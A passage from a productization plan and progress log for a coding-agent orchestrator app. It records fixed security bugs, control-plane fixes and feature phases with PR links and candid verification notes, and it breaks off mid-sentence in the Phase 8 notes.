# Productization Plan + Bug/Security Fix List

**Audience: the implementing model (Sonnet).** This doc was produced by a full read of
the codebase (all of `packages/*` and `apps/web`) plus the existing docs (PRD,
ARCHITECTURE, NEXT_STEPS, CONTRACT). It has four parts:

- **Part 1 — Fix first**: real bugs and security issues found in the current code,
  ordered by severity, each with a concrete fix. Do these before any Part 2 feature.
- **Part 2 — Productization features**: what to build to turn this into a polished,
  robust product for developers who hold multiple model subscriptions and want to run
  coding agents in parallel (autonomous runs, remote updates, mid-run intervention).
- **Part 3 — Review-pass fixes & next features** (added 2026-07-05 after Parts 1–2
  completed, from an independent audit of the merged code by a second model): five
  fixes for defects the audit confirmed in the shipped Phase 6 work, then a second
  feature wave. Same rules, same workflow. Fable will re-verify each item after it
  merges, so keep verification evidence in the PR descriptions.
- **Part 4 — Post-plan audit & UX wave** (added 2026-07-06 after Part 3 completed):
  the audit record for the merged Phase 7/8 work (three integration fixes, already
  landed as PR #57), then a UX improvement wave (U1–U10) produced by walking every
  page of the real app in a browser. Completed 2026-07-06.
- **Part 5 — Post-UX-wave fixes & remote-QoL wave** (added 2026-07-07 after Part 4
  completed, from Fable's audit of the merged U1–U10 code plus a review of the app
  against the target deployment: the server on an EC2 instance inside the owner's
  Tailscale tailnet, planned and supervised from any device — often a phone —
  running near-autonomously): six fixes for defects/footguns confirmed in the
  current code, then a quality-of-life wave aimed at that remote deployment.
  Completed 2026-07-07.
- **Part 6 — Owner-requested QoL wave + Phase 10 audit fixes** (added 2026-07-07
  after Part 5 completed, from Fable's audit of the merged Phase 10 code plus
  eight new quality-of-life requests from the owner): three small fixes
  confirmed against the current code/docs, then a feature wave centered on
  planning-context uploads (attachments + archived plan-chat sessions),
  documentation quality (real guidelines for the docs-role model and a per-task
  documentation step in the merge pipeline), engineering-standards prompts for
  authors and validators, rate-limit resilience with Telegram alerts, an honest
  model round-trip test, and a skills strategy. Also picks up two leftovers
  Parts 4–5 deliberately deferred: the `@orc/server` test package and quota
  usage in the health panel.

**Ground rules for every change:**
- `main` is sacred: branch → PR → merge. Keep `npm run typecheck`, `npm run build`,
  and `npm test -w @orc/engine` green on every PR.
- The contract is `@orc/types`. If you add/change a route or type, update
  `packages/types/src/api.ts` (+ `ROUTES`), `docs/CONTRACT.md`, and the mock server.
- Work top of this list downward. Each item states files and acceptance criteria —
  verify the criteria before moving on.

---

## Progress

Tracks completion against the **Suggested execution order** table at the bottom of
this doc. Update this section (and re-check the acceptance criteria) as each phase
lands — this is the single place to see what's done vs. still open.

### Phase 1 — S1, S2, S3, S4 (injection/exposure holes) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| S1 — Command injection via `execSync` | ✅ done | [#3](https://github.com/IngeniousArtist/hoopedorc/pull/3) |
| S2 — Unauthenticated API, open CORS | ✅ done | [#4](https://github.com/IngeniousArtist/hoopedorc/pull/4) |
| S3 — Telegram bot token in plaintext | ✅ done | [#5](https://github.com/IngeniousArtist/hoopedorc/pull/5) |
| S4 — `rm -rf` on arbitrary path | ✅ done | [#6](https://github.com/IngeniousArtist/hoopedorc/pull/6) |

All four merged to `main`; `npm run typecheck`, `npm run build`, and
`npm test -w @orc/engine` green as of each merge. Notable follow-on additions made
while implementing this phase (not separate plan items, but relevant to later work):
- `Settings.apiToken` + a shared `SECRET_SENTINEL` (`@orc/types`) — the mechanism S3
  needed for Telegram-token redaction, generalized so S2's new `apiToken` secret uses
  it too. Reuse this sentinel for any future secret field.
- The web client (`apps/web/src/api/client.ts`) now stores a bearer token in
  `localStorage` and prompts once on a 401; this is a stopgap, not the polished
  onboarding UI — F1 should replace the `window.prompt()` with a real login step.

### Phase 2 — B1, B2, B3, B4, B5 (control-plane bugs) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B1 — Stop didn't stop the running agent | ✅ done | [#8](https://github.com/IngeniousArtist/hoopedorc/pull/8) |
| B2 — Log history dead after reload (`runId: ""`) | ✅ done | [#9](https://github.com/IngeniousArtist/hoopedorc/pull/9) |
| B3 — Manual dispatch vs. autonomous loop double-run | ✅ done | [#10](https://github.com/IngeniousArtist/hoopedorc/pull/10) |
| B4 — Run rows only written at run end | ✅ done | [#11](https://github.com/IngeniousArtist/hoopedorc/pull/11) |
| B5 — Unvalidated `PATCH /api/tasks/:id` status | ✅ done | [#12](https://github.com/IngeniousArtist/hoopedorc/pull/12) |

All five merged to `main`; `npm run typecheck`, `npm run build`, and
`npm test -w @orc/engine` green as of each merge (new engine unit tests added for
B1's stop mechanism and B4's live run row). B1, B3, and B4 were also verified live
against the real (non-mock) server — B4's live-run-row fix was confirmed with real
paid model calls (`GET /api/tasks/:id/runs` showing a genuine in-flight `"running"`
row with correct non-zero durations once terminal). Notable follow-on additions:
- `TASK_STATUSES` (`@orc/types/domain.ts`) is now the single source of truth for
  the `TaskStatus` union — reused by both the server's PATCH validation (B5) and
  the Board's column list, so they can't drift apart.
- `EngineRunner.manualRuns` (added for B3) also closed a gap B1 had flagged: `stopTask`
  can now reach a manually-dispatched task's own one-off orchestrator, not just the
  autonomous-loop one.
- The Board has no "Stop" button yet — B1 is backend-only (verified via the API);
  F3 (Part 2) is where the UI button gets wired up.

### Phase 3 — S5, B6–B15 (hygiene + rails) — ✅ DONE

Split into two batches (quick independent fixes first, then the meatier ones):

| Item | Status | PR |
|---|---|---|
| B6 — `in_review` status never set | ✅ done | [#14](https://github.com/IngeniousArtist/hoopedorc/pull/14) |
| B8 — Telegram Markdown metachar failures | ✅ done | [#15](https://github.com/IngeniousArtist/hoopedorc/pull/15) |
| B12 — Risky-file regex false positives | ✅ done | [#16](https://github.com/IngeniousArtist/hoopedorc/pull/16) |
| B13 — `scopesOverlap` mishandles globs | ✅ done | [#17](https://github.com/IngeniousArtist/hoopedorc/pull/17) |
| B14 — Unbounded `logs` table growth | ✅ done | [#18](https://github.com/IngeniousArtist/hoopedorc/pull/18) |
| B11 — Gates pass vacuously, no scripts | ✅ done | [#20](https://github.com/IngeniousArtist/hoopedorc/pull/20) |
| S5 — Sanitized env for spawned agents | ✅ done | [#21](https://github.com/IngeniousArtist/hoopedorc/pull/21) |
| B7 — Planner argv E2BIG risk | ✅ done | [#22](https://github.com/IngeniousArtist/hoopedorc/pull/22) |
| B9 — Mid-run task additions invisible | ✅ done | [#23](https://github.com/IngeniousArtist/hoopedorc/pull/23) |
| B10 — Zombie approvals after restart | ✅ done | [#24](https://github.com/IngeniousArtist/hoopedorc/pull/24) |
| B15 — WS broadcasts cross-project | ✅ done | [#25](https://github.com/IngeniousArtist/hoopedorc/pull/25) |

Batch 1 (B6, B8, B12, B13, B14) merged first; `npm run typecheck`,
`npm run build`, and `npm test -w @orc/engine` green as of each merge (10/10
tests, 4 new). B6, B12, and B13 verified with new unit tests; B6 additionally
live-verified with real model calls (`in_progress → in_review → in_progress`
on a gate-failure retry, observed via `GET /api/tasks/:id` on a throwaway
repo); B8 verified with a scripted `fetch` double (no Telegram bot available);
B14 live-verified against the real server (seeded an old/oversized DB, booted,
confirmed the exact row counts pruned). Notable finds:
- B13 surfaced a **second, previously-latent bug** while fixing the first:
  `Orchestrator.start()`'s dispatch loop computed `activeScopePaths` once per
  while-iteration and never updated it as tasks were dispatched within the
  same pass — masked until B13's `scopesOverlap` fix made it observable via a
  failing integration test. Both are fixed in PR #17.
- `isAuthOrSecretFile` and `scopesOverlap`/`staticScopePrefix` (B12, B13) are
  now exported from `orchestrator.ts` specifically so they're directly unit
  testable — a pattern worth continuing for future pure-logic fixes in this
  file.

Batch 2 (B11, S5, B7, B9, B10, B15) all merged to `main`; `npm run typecheck`,
`npm run build`, `npm test -w @orc/engine` (13/13, 3 new), and
`npm test -w @orc/adapters` (2/2, new — the package had no test script before
S5) green as of each merge. B11 and B9 verified with new unit tests; S5
verified with new unit tests plus reasoning about real CLI/gate-script
behavior; B7's stdin-vs-argv switch was live-verified directly against the
installed `claude`/`opencode` CLIs (piped stdin genuinely used as the prompt,
not ignored) rather than through the full seed-e2e harness; B10 and B15 were
both live-verified against the real (non-mock) server — B10 by seeding a
zombie approval and confirming the boot-time expiry + 410 response; B15 by
subscribing three raw WS clients to different projects and confirming a
`task.updated` broadcast only reached the one subscribed to the matching
project. Notable finds/decisions:
- B11 fixed the root cause too, not just the symptom: appended a standing
  instruction to the planner's deconstruct prompt so a brand-new project's
  first scaffold task sets up real `test`/`build`/`lint`/`typecheck` scripts,
  instead of only detecting the vacuous-gate state after the fact.
- B9's fix replaced the older single-task `SchedulerDeps.getTask` refresh
  hook entirely with a broader `getTasks` reconciliation run at the top of
  every loop pass — one mechanism now covers both "new task appeared" and
  "a known task's fields changed," including `status` (which the old hook
  never adopted).
- B15 required adding `projectId` to `Run`/`LogEvent`/`MergeDecision` (a
  schema migration via the existing `ALTER TABLE` list in `db/index.ts`) since
  those three `ServerEvent` payloads were the only ones that didn't already
  carry one.
- Did not add a Board warning banner for B11's vacuous-gate case — the web
  app has no plumbing yet to surface `GateResult`/`MergeDecision` per task at
  all; that's squarely F2's "Review tab" scope.

### Phase 4 — F1, F2, F3, F4 (core product loop) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| F1 — First-run onboarding wizard | ✅ done | [#27](https://github.com/IngeniousArtist/hoopedorc/pull/27) |
| F2 — Task detail drawer | ✅ done | [#28](https://github.com/IngeniousArtist/hoopedorc/pull/28) |
| F3 — Mid-run control | ✅ done | [#29](https://github.com/IngeniousArtist/hoopedorc/pull/29) |
| F4 — Live mission control strip | ✅ done | [#30](https://github.com/IngeniousArtist/hoopedorc/pull/30) |

All four merged to `main`; `npm run typecheck`, `npm run build`, and
`npm test -w @orc/engine` (14/14, 1 new) green as of each merge. Every item was
live-verified in a real browser against a real (non-mock) server seeded
directly via SQLite for the specific scenario each feature needed (empty DB
for F1's onboarding gate; a task with real runs + merge decisions for F2's
tabs; a running project + an in-flight task for F3's stop/add-task/pause
controls; active tasks + budget + a pending approval for F4's strip) — not
just typechecked. Notable finds/decisions:
- F1: extracted `RoutingEditor` out of `Settings.tsx` into a shared component
  (now used by both Settings and the wizard) instead of duplicating ~110
  lines; added a new `GET /api/setup/models` endpoint (shells `opencode
  models`) so the model-mapping step offers a real datalist instead of a
  blind text field.
- F2: `LogPanel.tsx` was repurposed into just the log list (no outer
  fixed-shell/close-button) since `TaskDrawer` now owns that shell across all
  four tabs. New `GET /api/tasks/:id/decisions` route — the repo function
  (`getMergeDecisions`) already existed, just wasn't wired to a route.
- F3: "Reprioritize via drag" needed zero new code — the Board's existing
  generic drag-and-drop plus B5's PATCH validation already implemented it.
  New `Orchestrator.pause(project, { drain? })`: drain mode forces the
  dispatch loop's `ready` list empty instead of aborting, letting active
  tasks finish naturally; `EngineRunner.pause` only removes the orchestrator
  from its map for the non-drain case, so a second Start can't race in while
  a drain is still finishing. Live testing caught and fixed a real bug: the
  Stop confirm/toast text said "requeued to backlog" but the actual behavior
  is "moved to Blocked".
- F4: reused `TaskCard`'s `Heartbeat`/`agoLabel` (now exported) instead of
  duplicating elapsed-time formatting; `Board.tsx`'s existing `costAnalytics`
  fetch already returned `budgetUsd`, just wasn't being read — no new
  request needed for the budget bar.

### Phase 5 — F5, F6, F7, F8 (away-from-keyboard autonomy) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| F5 — Notifications that reach the user | ✅ done | [#32](https://github.com/IngeniousArtist/hoopedorc/pull/32) |
| F6 — Model health + subscription awareness | ✅ done | [#33](https://github.com/IngeniousArtist/hoopedorc/pull/33) |
| F7 — Cost guardrails short of the hard stop | ✅ done | [#34](https://github.com/IngeniousArtist/hoopedorc/pull/34) |
| F8 — Autonomous-run report card | ✅ done | [#35](https://github.com/IngeniousArtist/hoopedorc/pull/35) |

All four merged to `main`; `npm run typecheck`, `npm run build`,
`npm test -w @orc/engine` (15/15, 1 new), and `npm test -w @orc/adapters`
(4/4, 2 new) green as of each merge. UI-touching pieces were live-verified in
a real browser against a real (non-mock) server seeded directly via SQLite;
server-only logic (cooldown skip, budget-threshold gating, run-summary
computation) was verified with standalone scripts that boot a real
`EngineRunner`/`Orchestrator` against a real in-memory SQLite DB and reach
private methods via `as any` — exercising actual production code paths, not
reimplementations. Notable finds/decisions:
- F5: `Settings.telegram.digest` (`"off" | "terminal" | "all"`) gates task
  status pushes independent of the always-unconditional audit entry and
  always-sent approval requests. New `ApprovalContext` (PR url + top
  validator reasons) enriches the Telegram approval message. New
  `useBrowserNotify` context wraps the Notifications API — only fires while
  the tab is hidden, so it doesn't nag an already-focused window.
- F6: adapters classify a failed run's `exitReason` as `"rate_limited"` (new
  `classifyFailure`, regex against the failure summary) instead of the
  generic `"error"`; `EngineRunner` tracks a cross-project in-memory
  cooldown map keyed by model, consulted via a new
  `SchedulerDeps.checkModelCooldown` hook at dispatch time — mirrors
  `checkBudget` exactly (skip, don't fail, warn once). New `model_checks`
  table persists "Test models" results so the new SetupView health panel's
  "last check" column survives a reload; failure rate + median duration come
  from the existing `runs` table (median computed in JS — SQLite has no
  `MEDIAN` aggregate).
- F7: new `budget_alerts` table (unique on `scope, threshold`) makes the
  50%/80% warnings fire exactly once each; the global scope's key bakes in
  the calendar month (`global:2026-07`) so a new month re-arms both
  thresholds without any explicit reset, matching how the global budget
  itself is month-scoped. Raising a project's budget cap also clears its
  recorded alerts, so crossing 80% once doesn't permanently silence future
  warnings. The per-task estimate chip reused the `estimate.ts`/
  `GET /api/projects/:id/estimate` machinery that already existed but was
  unused by the Board. The "budget bar turns amber/red" ask needed zero new
  code — F4's `MissionControl` already covered it.
- F8: report cards are scoped to one autonomous-loop start-to-finish cycle
  (`ts >= runStartedAt` against the audit log), not the project's lifetime
  totals — a new `repo.getCostSince` made that precise. Persisted as a
  `run_summary`-kind audit entry; `AuditView` separates those out into a
  dedicated "Run Reports" section instead of mixing them into the
  chronological list. Skipped the plan's optional "pipe through the
  updates-role model for natural language" toggle — explicitly optional, and
  the plan itself says the mechanical digest must not depend on a model.

### Phase 6 — F9, F10, F11, F12 (flexibility, packaging, docs) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| F9 — Project templates & per-project gate config | ✅ done | [#37](https://github.com/IngeniousArtist/hoopedorc/pull/37) |
| F10 — Packaging & deployment | ✅ done | [#38](https://github.com/IngeniousArtist/hoopedorc/pull/38) |
| F11 — Docs for other users | ✅ done | [#39](https://github.com/IngeniousArtist/hoopedorc/pull/39) |
| F12 — Multi-project run queue | ✅ done | [#40](https://github.com/IngeniousArtist/hoopedorc/pull/40) |

All four merged to `main`; `npm run typecheck`/`npm run build` green
across every workspace as of each merge. **This closes out Phase 6 — every
item in Part 1 (security/bugs) and Part 2 (product features) of this plan
is now done.** F12: `ModelConfig.maxConcurrent` was only ever enforced
per-`Orchestrator`-instance, so two concurrently-running projects could
each dispatch `maxConcurrent` copies of the same model at once — new
optional `SchedulerDeps.getModelActive`/`incModelActive`/`decModelActive`
hooks let `EngineRunner.buildOrchestrator` wire every project's Orchestrator
to ONE shared counter instead (falls back to a local per-instance count
when the hooks are absent, e.g. unit tests). Writing the test for this
surfaced a real correctness gap the change introduced: the dispatch loop's
"nothing dispatched, nothing of mine active → wind down" exit condition
assumed a blocked task could only be freed by this orchestrator's own
activity — with a shared cap, it can now be freed by a *different*
project's task finishing, so a new `blockedByCapacity` flag makes that
specific case poll-and-retry instead of prematurely ending the run.
`ProjectsView` also gained inline Start/Pause per row (previously
read-only). Verified: `npm test -w @orc/engine` 21/21 (1 new, proving two
separate Orchestrator instances sharing an injected registry actually
serialize dispatch of a capped model); the real `EngineRunner` wiring
itself (not just Orchestrator logic) was live-verified via a standalone
script reaching `buildOrchestrator` for two different real projects and
confirming their deps share one counter; the Projects-page buttons'
underlying routes were live-verified via curl. Browser screenshot
verification was attempted for both F11 and F12's UI pieces but the Chrome
extension tool errored at the frame level across several attempts
(confirmed via curl that the dev servers themselves served fine) — noted
rather than claimed.

F11 merged to `main`; `npm run typecheck`/`npm run build` (`@orc/web`)
green. New `docs/USER_GUIDE.md` covers what it is, install/prereqs (which
subscription each specialist model needs, `opencode auth login`), a
first-project tutorial, the safety model, remote Tailscale setup, and a
troubleshooting table drawn from real failure modes hit during development
(the historic PWD/worktree bug, `opencode`'s "database is locked"
collision-retry, vacuous gates, a misconfigured self-review validator, and
F10's Keychain/Docker auth caveat). Linked from the README and the app's
Setup page. Browser live-verification was attempted but the Chrome
extension tool errored at the frame level regardless of URL (confirmed via
curl that the dev server itself served fine) — for this one, a single
external link with no new logic, typecheck+build+code review stood in for
a screenshot.

F10 merged to `main`; `npm run typecheck`/`npm run build` green,
`npm test -w @orc/engine` (20/20) / `-w @orc/adapters` (4/4) unaffected. The
server now serves the built web app itself (`@fastify/static` on
`apps/web/dist`, no-op until that directory exists so `npm run dev` is
unaffected) with a SPA-style fallback to `index.html` for unmatched non-API
paths — live-verified against the real built `dist/index.js`, not just
source. New root `npm run start`/`npm run setup` (`scripts/init.mjs`) and a
`hoopedorc` CLI (`bin/hoopedorc.mjs`); `npm run setup` was run for real
(created `.env`, all three CLI checks passed). `deploy/` holds a systemd
unit (the primary supported path) plus a reference Dockerfile/compose —
writing the Docker auth caveats surfaced a real, verified fact worth
remembering: **Claude Code's login lives in the macOS Keychain**, which a
Linux container cannot access at all (mountable or not); the documented
workaround is `ANTHROPIC_API_KEY` (confirmed via `claude --help`'s `--bare`
mode), which bills per-token via the Console rather than a Pro/Max
subscription's flat rate. The Docker path itself was **not** built/run
against a live daemon (none available in this environment) — it's a
documented starting point, not a verified recipe. New `CHANGELOG.md`
(retroactive entries per phase) + README updates.

F9 merged to `main`; `npm run typecheck`, `npm run build`, `npm test -w
@orc/engine` (20/20, 5 new), and `npm test -w @orc/adapters` (4/4) green.
New `Project.config` (`ProjectConfig`) holds per-project gate script
overrides (or `false` to skip a gate), a free-form `testCommand` for
non-npm stacks (execFile, no shell), a `maxAttempts` default for tasks
created in that project, and a `mergePolicy` override — all optional, so an
unset project behaves exactly as before. `GateRunnerImpl` reads
`project.config.gates` directly (it already receives `project` via
`.run(project, task)`, so no `SchedulerDeps.gateConfig` plumbing was needed
— a deliberate simplification vs. the plan's original wording);
`canAutoMerge` resolves `project.config?.mergePolicy` before falling back to
`Settings.mergePolicy`. New shared `ProjectConfigFields` "Advanced" accordion
used by both `NewProject` (create) and `ProjectHeader` (post-creation edit,
budget-row-style dirty-check + save). Live-verified against a real
(non-mock) server via curl + sqlite3: config round-trips on create/GET,
invalid values 400, PATCH updates/null-clears it, maxAttempts default
applies correctly with and without an override, and an old pre-F9 DB
migrates cleanly. Notable find: writing real (non-mocked) tests for the
gate overrides surfaced a genuine pre-existing bug in B11's vacuous-gate
detection — `npm run <script> --if-present` exits 0 whether or not the
script exists, so the old `ran` flag (inferred from a thrown error) was
silently always `true` on success in every real repo, only ever
"working" in mocked tests. Fixed by checking `package.json` directly
(`hasNpmScript`) instead of inferring presence from npm's exit behavior.

### Phase 7 — B16–B19, S6 (review-pass fixes) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| B16 — Dockerfile build stage certainly fails (missing COPYs) | ✅ done | [#42](https://github.com/IngeniousArtist/hoopedorc/pull/42) |
| B17 — Configured-but-missing gate script silently passes | ✅ done | [#43](https://github.com/IngeniousArtist/hoopedorc/pull/43) |
| B18 — Capacity-blocked project waits silently | ✅ done | [#44](https://github.com/IngeniousArtist/hoopedorc/pull/44) |
| B19 — Manual dispatch invisible to the global model cap | ✅ done | [#45](https://github.com/IngeniousArtist/hoopedorc/pull/45) |
| S6 — Auth polish: real login screen, constant-time compare, doc note | ✅ done | [#46](https://github.com/IngeniousArtist/hoopedorc/pull/46) |

B16 fixed: `deploy/Dockerfile`'s build stage now copies `tsconfig.base.json`,
`bin/`, and `scripts/` before `npm ci` (every workspace tsconfig extends the
root base config, and the root `package.json` declares a `bin` entry +
`setup` script pointing at those paths, so both were required for `npm ci`
and `npm run build` to succeed). No Docker daemon available in this
environment — verified by replicating the exact post-fix `COPY` set
(`package*.json`, `tsconfig.base.json`, `bin/`, `scripts/`, `packages/`,
`apps/`, excluding gitignored `node_modules`/`dist` to match what a real
build context from a git checkout would contain) into a fresh temp dir and
running `npm ci && npm run build` there — both succeeded.

B17 fixed: `gate-runner.ts`'s `runGate()` and `runTestsGate()`'s `testScript`
branch now check `hasNpmScript` for an explicit override *before* delegating
to `runScript`, returning a hard `passed: false` with a
`configured gate script "<name>" not found in package.json` message when the
named script doesn't exist — mirrors `runCommand`'s existing reasoning for
`testCommand` (operator-configured means failures are real, not "nothing to
run"). The default-slot path (no override) is untouched: `runScript`'s own
internal `hasNpmScript` check still returns `{ passed: true, ran: false }`
for a repo with no default `typecheck`/`lint`/`build`/`test` scripts, which
is exactly the B11 vacuous-gate signal. Three new `gate-runner.test.ts`
cases cover all three acceptance scenarios (typecheck override missing →
fails loudly; testScript override missing → fails the tests gate loudly;
default-slot missing script with no override → still passes vacuously) —
24/24 engine tests green (3 new).

B18 fixed: `orchestrator.ts` gained a `capacityBlockedWarned` Set that
mirrors `budgetBlockedWarned`/`cooldownBlockedWarned` exactly — cleared in
`start()`, one `"warn"`-level log ("Model at capacity (in use by another
task or project), holding: `<model>`") emitted the first time the
`active >= cfg.maxConcurrent` skip fires for a task, and deleted from the
set right where the task actually dispatches (mirroring the budget/cooldown
delete-on-dispatch pattern). Previously the F12 capacity skip was the only
one of the three dispatch-blocking checks with no log line at all — with a
shared cross-project cap, a project could sit polling for minutes on
another project's model slot looking indistinguishable from a hang. New
unit test: pre-load a shared registry already at `maxConcurrent`, let the
250ms poll loop run several passes (600ms), confirm exactly one capacity
warn log fires (not one per poll), then free the slot and confirm the task
dispatches and completes. 25/25 engine tests green (1 new).

B19 fixed: `runTask()` (the `/dispatch` manual-run path) now calls
`this.incModel(task.assignedModel)` and `this.runningModel.set(task.id, ...)`
before `executeTask`, and its `finally` mirrors `start()`'s dispatch-finally
exactly — decrement whichever model the task last ran on (fallback
escalation may have switched it), then clear `runningModel`/`activeTaskIds`.
Deliberately does **not** add a capacity *check* to `runTask`: a manual
dispatch is a human's explicit action and must never be silently
capacity-blocked, but until this fix it was invisible to the shared F12
registry, so the autonomous loop (or another project) could pile
`maxConcurrent` *more* copies of the same model on top of it. Updated the
stale `manualRuns` doc-comment in `engine-runner.ts`, which previously
stated manual runs "never contribute to that count" — they now do (the
capacity check is still skipped, only the counting changed). New unit test:
a manually-dispatched task and a second `Orchestrator`'s autonomous-loop
task share a registry and both target a `maxConcurrent: 1` model — asserts
their author adapter calls never overlap (`maxConcurrentAuthors === 1`) and
both finish `done`. As documented in the plan, left the known escalation
transient-overshoot case alone (fallback escalation increments the next
model without a capacity check — blocking mid-task risks deadlock, so a
brief overshoot is the accepted tradeoff). 26/26 engine tests green (1 new).

S6 fixed (all three leftovers): **(1) Login screen.** New
`apps/web/src/components/TokenGate.tsx` — a small centered card, rendered by
`App.tsx` only when `client.ts`'s new `setUnauthorizedHandler` callback
fires (i.e. only after a real 401; auth-off, the default, never trips it).
`client.ts` replaced the old blocking browser-prompt stopgap with
`export function setUnauthorizedHandler(h)`; on 401 it awaits the handler,
stores what it resolves with, and retries once. `TokenGate` validates the
entered token itself — a raw `fetch(apiUrl("getSettings"))` with the
candidate token, bypassing `api()` to avoid recursing back into the 401
handler — so by the time it resolves the outer promise the token is already
confirmed-good, and it shows an inline "Incorrect token." error and stays
open on a bad guess instead of closing and surfacing a generic error
elsewhere. `useWS.ts` needed no changes: it already reads
`getStoredApiToken()` fresh on every reconnect attempt (verified by reading
the code, then confirming live — see below). `grep -r` for the old prompt
mechanism (matched as a literal string) now returns nothing under
`apps/web/src`. **(2) Constant-time compare.** New `safeTokenEqual()` in
`index.ts`'s auth hook uses `node:crypto`'s `timingSafeEqual` on UTF-8
buffers with a length-mismatch guard first (since `timingSafeEqual` throws
rather than returning `false` on unequal lengths); applied to both the
bearer-header and `?token=` query-param checks. **(3) Docs.** New paragraph
in `USER_GUIDE.md`'s Remote setup section: the SPA shell (`/`, JS, CSS) is
served without a token even when `API_TOKEN` is set — only `/api/*` and the
WebSocket upgrade are gated — by design (the shell has no data in it), but
worth knowing since anyone reaching the port can see Hoopedorc is running
there. Live-verified end-to-end against a real (non-mock) server with
`API_TOKEN` set, using `agent-browser` against the actual built
`apps/web/dist` (F10's static-serving path, not the Vite dev server): fresh
page load (cleared `localStorage`) showed the in-app TokenGate with no
native browser dialog; submitting a wrong token showed the inline
"Incorrect token." error and the gate stayed open (screenshotted); a
followup fresh page load after clearing `localStorage` and setting a stale
bogus token confirmed the gate is skipped entirely when the server has no
`API_TOKEN` configured, regardless of leftover `localStorage` content;
submitting the correct token closed the gate and loaded the full Board with
live mock data. Server request logs confirm the WebSocket path specifically:
an unauthenticated `GET /ws` attempt was rejected `401` before the token was
entered, then subsequent `GET /ws?token=...` upgrade attempts after
authenticating were **not** 401'd (no rejection logged for any of them),
proving the socket itself authenticated — not just the REST calls. Also
curl-verified the constant-time compare's observable behavior directly: no
token → 401, wrong token → 401, correct token → 200, `/api/health` and the
SPA shell → 200 unauthenticated in all cases. `npm run typecheck`/
`npm run build` green across all workspaces; `npm test -w @orc/engine`
(26/26) and `-w @orc/adapters` (4/4) unaffected (`@orc/server` has no test
package of its own — live verification is the bar for server-only changes
here, matching precedent from S2's original auth-hook work).

### Phase 8 — F14–F19 (user opted in to F19 too) — ✅ DONE

| Item | Status | PR |
|---|---|---|
| F14 — CI for this repo (GitHub Actions) | ✅ done | [#48](https://github.com/IngeniousArtist/hoopedorc/pull/48) |
| F15 — "Wait for GitHub checks" merge gate | ✅ done | [#51](https://github.com/IngeniousArtist/hoopedorc/pull/51) |
| F16 — Subscription quota awareness | ✅ done | [#52](https://github.com/IngeniousArtist/hoopedorc/pull/52) |
| F17 — DB backup rotation | ✅ done | [#53](https://github.com/IngeniousArtist/hoopedorc/pull/53) |
| F18 — Sandbox design doc (docs only) | ✅ done | [#54](https://github.com/IngeniousArtist/hoopedorc/pull/54) |
| F19 — Scheduled runs (previously optional — user explicitly asked for it after Phase 7, so it's in scope; do after F14-F17) | ✅ done | [#55](https://github.com/IngeniousArtist/hoopedorc/pull/55) |

F14 fixed: new `.github/workflows/ci.yml` runs on every PR and push to
`main` — checkout, `setup-node@v4` (node 22, npm cache), `npm ci`,
`npm run typecheck`, `npm run build`, `npm test -w @orc/engine`,
`npm test -w @orc/adapters`. No Docker build step, no secrets needed. The
very first CI run immediately found a real, previously-invisible bug:
`npm run typecheck` failed everywhere with "Cannot find module '@orc/types'"
because `@orc/types`/`@orc/adapters`/`@orc/engine` all resolve their
`"types"` field to `./dist/index.d.ts`, and a fresh checkout has no `dist/`
at all (gitignored) — this was masked in every local dev session so far
because `dist/` always already existed from some earlier build. Reproduced
locally by deleting every workspace's `dist/` and hitting the identical
failure. Fixed the root cause: the root `typecheck` script now builds
`@orc/types` → `@orc/adapters` → `@orc/engine` (mirroring the existing
`build` script's dependency order) before running the per-workspace `tsc`
checks — so `npm run typecheck` alone is correct on any fresh checkout, not
just under CI. Verified: reran the full sequence from a clean `dist`-less
state (typecheck → build → both test suites, all green), then confirmed the
actual GitHub Actions run on the PR went green via `gh pr checks --watch`.

F15 fixed: new opt-in per-project `ProjectConfig.requireGithubChecks` +
`githubChecksTimeoutMin` (integer 1–120, default 15). **Verified the real
`gh` CLI's behavior by hand before writing any code** (per the plan's
explicit instruction not to trust the paragraph's assumptions) using a
throwaway probe PR against this very repo — the actual semantics turned out
cleaner than assumed: with `--json bucket,state,name`, `gh pr checks`
**always exits 0** for pass/pending/fail alike (the real state lives in
each check's `bucket` field, not the exit code — confirmed `"pass"`,
`"pending"`, `"fail"` directly); the **one** case that still throws (exit 1)
even with `--json` is "no checks configured at all", which prints a literal
`no checks reported on the '<branch>' branch` message instead of any JSON.
New `GitService.waitForChecks(project, prNumber, timeoutMs, onPoll?)` in
`git-service.ts` polls every 15s on exactly that logic: parse the JSON
array, `"fail"`/`"cancel"` bucket → `"failed"`; no `"pending"` bucket left →
`"passed"`; the "no checks reported" message → `"none"`; any other
unexpected CLI error tolerated (keep polling, don't fail the task over one
bad poll) until `timeoutMs` elapses → `"timeout"`. `Orchestrator.executeTask`
consults it right before the existing `canAutoMerge` risk check (after
`syncBranchWithMain`, guarded by `project.config?.requireGithubChecks`):
`"passed"`/`"none"` fall through to the normal risk-based merge decision
unchanged; `"failed"`/`"timeout"` skip straight to the existing
`requestApproval` escalation (reusing the same `approve_merge`/`reject`
shape as the risky-change path) since there's nothing more for
`canAutoMerge` to add once GitHub's own CI has already failed or hung.
`bailIfStopRequested` is checked immediately after the wait returns, so a
Stop press during a multi-minute wait can't be overtaken by checks finishing
and auto-merging behind it. Investigated the plan's stuck-detector warning
directly in the code rather than assuming it applied: `STUCK_DETECTION`'s
actual watchdog timers (`maxRunTimer`/`idleTimer`) are scoped and cleared
entirely within `runAuthor`, so a wait during the merge phase can't trigger
an abort — but the Board's `TaskCard` heartbeat indicator (`apps/web/.../
TaskCard.tsx`) mirrors the same `idleMs` threshold purely cosmetically from
log timestamps, so a silent multi-minute wait would still make the card
misleadingly look "possibly stuck" to a human watching the Board. Emitting
an info log line on every poll (as the plan asked) keeps that heartbeat
honest regardless of which mechanism was actually at risk. New
`apps/web/src/components/ProjectConfigFields.tsx` checkbox + conditional
timeout-minutes input alongside F9's other per-project Advanced fields.
Verified: 5 new engine unit tests with a fake `GitService` covering all
four outcomes plus the Stop-during-wait case (31/31 engine tests green,
4/4 adapters); **also live-verified the real (non-fake) `GitServiceImpl.
waitForChecks` implementation** via a standalone script against real PRs in
this repo — PR #48 (real passed CI) → `"passed"`, PR #47 (merged before CI
existed, no checks) → `"none"`, and a throwaway broken PR → `"failed"` —
exercising the actual JSON-parsing/bucket-decision code, not just CLI
